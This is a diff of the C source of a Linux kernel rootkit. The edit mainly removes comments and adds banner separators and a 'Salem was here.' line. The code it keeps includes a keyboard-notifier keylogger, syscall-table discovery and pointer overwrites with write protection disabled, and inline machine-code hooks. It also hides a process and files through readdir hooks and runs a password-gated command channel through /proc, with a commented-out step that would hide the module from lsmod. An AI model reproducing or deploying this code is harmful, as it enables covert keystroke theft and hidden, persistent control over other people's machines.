@@ -170,14 +170,7 @@ struct notifier_block nb = {
 //////////////////////////////////////////////////////////////////////////////////////end////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////////////////end keylogger////////////////////////////////////////////////////////////
 
-/**
- * Finds a system call table based on a heruistic.
- * Note that the heruistic is not ideal, so it might find a memory region that
- * looks like a system call table but is not actually a system call table, but
- * it seems to work all the time on my systems.
- *
- * @return system call table on success, NULL on failure.
- */
+
 void **find_syscall_table(void)
 {
     void **sctable;
@@ -211,10 +204,8 @@ void **find_syscall_table(void)
     return NULL;
 }
 
-// ========== END SYS_CALL_TABLE ==========
-
-// ========== HOOK LIST ==========
-
+//////////////////////////////////////////////////////////////////////////////////////  HOOK LIST ////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 struct hook
 {
     void *original_function;
@@ -225,21 +216,6 @@ struct hook
 
 LIST_HEAD(hook_list);
 
-/**
- * Replaces a function pointer at some address with a new function pointer,
- * keeping record of the original function pointer so that it could be
- * restored later.
- *
- * @param modified_at_address Pointer to the address of where the function
- * pointer that we want to replace is stored. The same address would be used
- * when restoring the original funcion pointer back, so make sure it doesn't
- * become invalid by the time you try to restore it back.
- *
- * @param modified_function Function pointer that we want to replace the
- * original function pointer with.
- *
- * @return true on success, false on failure.
- */
 int hook_create(void **modified_at_address, void *modified_function)
 {
     struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
@@ -260,13 +236,7 @@ int hook_create(void **modified_at_address, void *modified_function)
     return 1;
 }
 
-/**
- * Get original function pointer based on the one we overwrote it with.
- * Useful when wanting to call the original function inside a hook.
- *
- * @param modified_function The function that overwrote the original one.
- * @return original function pointer on success, NULL on failure.
- */
+
 void *hook_get_original(void *modified_function)
 {
     void *original_function = NULL;
@@ -283,30 +253,18 @@ void *hook_get_original(void *modified_function)
     return original_function;
 }
 
-/**
- * Removes all hook records, restores the overwritten function pointer to its
- * original value.
- */
+
 void hook_remove_all(void)
 {
     struct hook *h, *tmp;
 
-    // make it so that instead of `modified_function` the `original_function`
-    // would get called again
     list_for_each_entry(h, &hook_list, list)
     {
         DISABLE_W_PROTECTED_MEMORY
         *h->modified_at_address = h->original_function;
         ENABLE_W_PROTECTED_MEMORY
     }
-    // a hack to let the changes made by the loop above propagate
-    // as some process might be in the middle of our `modified_function`
-    // and call `hook_get_original()`, which would return NULL if we
-    // `list_del()` everything
-    // so we make it so that instead of `modified_function` the
-    // `original_function` would get called again, then sleep to wait until
-    // existing `modified_function` calls finish and only them remove elements
-    // fro mthe list
+// Salem was here.
     msleep(10);
     list_for_each_entry_safe(h, tmp, &hook_list, list)
     {
@@ -315,7 +273,6 @@ void hook_remove_all(void)
     }
 }
 
-// ========== END HOOK LIST ==========
 
 
 asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
@@ -335,18 +292,13 @@ asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
     return original_write(fd, buf, count);
 }
 
-// ========== ASM HOOK LIST ==========
 
 #if defined __i386__
-// push 0x00000000, ret
 #define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
 #define ASM_HOOK_CODE_OFFSET 1
-// alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
-//#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
+
 #elif defined __x86_64__
-// there is no push that pushes a 64-bit immidiate in x86_64,
-// so we do things a bit differently:
-// mov rax 0x0000000000000000, jmp rax
+
 #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
 #define ASM_HOOK_CODE_OFFSET 2
 #else
@@ -363,10 +315,7 @@ struct asm_hook
 
 LIST_HEAD(asm_hook_list);
 
-/**
- * Patches machine code of the original function to call another function.
- * This function should not be called directly.
- */
+
 void _asm_hook_patch(struct asm_hook *h)
 {
     DISABLE_W_PROTECTED_MEMORY
@@ -375,17 +324,7 @@ void _asm_hook_patch(struct asm_hook *h)
     ENABLE_W_PROTECTED_MEMORY
 }
 
-/**
- * Patches machine code of a function so that it would call our function.
- * Keeps record of the original function and its machine code so that it could
- * be unpatched and patched again later.
- *
- * @param original_function Function to patch
- *
- * @param modified_function Function that should be called
- *
- * @return true on success, false on failure.
- */
+
 int asm_hook_create(void *original_function, void *modified_function)
 {
     struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);
@@ -405,12 +344,7 @@ int asm_hook_create(void *original_function, void *modified_function)
     return 1;
 }
 
-/**
- * Patches the original function to call the modified function again.
- *
- * @param modified_function Function that the original function was patched to
- * call in asm_hook_create().
- */
+
 void asm_hook_patch(void *modified_function)
 {
     struct asm_hook *h;
@@ -425,11 +359,7 @@ void asm_hook_patch(void *modified_function)
     }
 }
 
-/**
- * Unpatches machine code of the original function, so that it wouldn't call
- * our function anymore.
- * This function should not be called directly.
- */
+
 void _asm_hook_unpatch(struct asm_hook *h)
 {
     DISABLE_W_PROTECTED_MEMORY
@@ -437,13 +367,7 @@ void _asm_hook_unpatch(struct asm_hook *h)
     ENABLE_W_PROTECTED_MEMORY
 }
 
-/**
- * Unpatches machine code of the original function, so that it wouldn't call
- * our function anymore.
- *
- * @param modified_function Function that the original function was patched to
- * call in asm_hook_create().
- */
+
 void *asm_hook_unpatch(void *modified_function)
 {
     void *original_function = NULL;
@@ -462,9 +386,7 @@ void *asm_hook_unpatch(void *modified_function)
     return original_function;
 }
 
-/**
- * Removes all hook records, unpatches all functions.
- */
+
 void asm_hook_remove_all(void)
 {
     struct asm_hook *h, *tmp;
@@ -477,7 +399,6 @@ void asm_hook_remove_all(void)
     }
 }
 
-// ========== END ASM HOOK LIST ==========
 
 
 asmlinkage long asm_rmdir(const char __user *pathname)
@@ -491,7 +412,9 @@ asmlinkage long asm_rmdir(const char __user *pathname)
     return ret;
 }
 
-// ========== PID LIST ==========
+////////////////////////////////////////////////////////////////////////////////////// END HOOK LIST////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 
 struct pid_entry
 {
@@ -517,9 +440,7 @@ int pid_add(const char *pid)
     return 1;
 }
 
-// ========== END PID LIST ==========
 
-// ========== FILE LIST ==========
 
 struct file_entry
 {
@@ -529,8 +450,8 @@ struct file_entry
 
 LIST_HEAD(file_list);
 
-// ========== READDIR ==========
-
+////////////////////////////////////////////////////////////////////////////////////// File Operations////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 struct file_operations *get_fop(const char *path)
 {
     struct file *file;
@@ -546,8 +467,7 @@ struct file_operations *get_fop(const char *path)
     return ret;
 }
 
-// Macros to help reduce repeated code where only names differ.
-// Decreses risk of "copy-paste & forgot to rename" error.
+
 #define FILLDIR_START(NAME)                                                                                              \
     filldir_t original_##NAME##_filldir;                                                                                 \
                                                                                                                          \
@@ -572,7 +492,6 @@ struct file_operations *get_fop(const char *path)
         return ret;                                                    \
     }
 
-// Macros to actually use
 #define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
 #define READDIR_HOOK_END(NAME) \
     FILLDIR_END(NAME)          \
@@ -616,7 +535,6 @@ READDIR_HOOK_END(sys)
 #undef READDIR_HOOK_START
 #undef READDIR_HOOK_END
 
-// ========== END READDIR ==========
 
 static char *proc_to_hide = "7821";
 static struct file_operations proc_fops;
@@ -653,7 +571,6 @@ int iterate_modified(struct file *file, struct dir_context *ctx)
     return result;
 }
 
-// ========== COMM CHANNEL ==========
 
 static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
 {
@@ -692,8 +609,7 @@ int execute_command(const char __user *str, size_t length)
 
     pr_info("Password check passed\n");
 
-    // since the password matched, we assume the command following the password
-    // is in the valid format
+
 
     str += sizeof(CFG_PASS);
 
@@ -780,18 +696,11 @@ found:;
     return 1;
 }
 
-// ========== END COMM CHANNEL ==========
 
 int init(void)
 {
     pr_info("Module loaded\n");
 
-    /*invisble kernel module*/
-    // list_del_init(&__this_module.list);
-    // kobject_del(&THIS_MODULE->mkobj.kobj);
-    // printk("invisible: module loaded\n");
-    /*end invisible lsmod kernel*/
-    /*keylogger listener setup*/
      register_keyboard_notifier(&nb);
 
 
@@ -821,12 +730,7 @@ int init(void)
 
 void exit(void)
 {
-    /*un register keylogger*/
 
-    //  if(kern_path("/proc", 0, &p))
-    //     return;
-    // proc_inode = p.dentry->d_inode;
-    // proc_inode->i_fop = backup_proc_fops;
     hook_remove_all();
     asm_hook_remove_all();
     
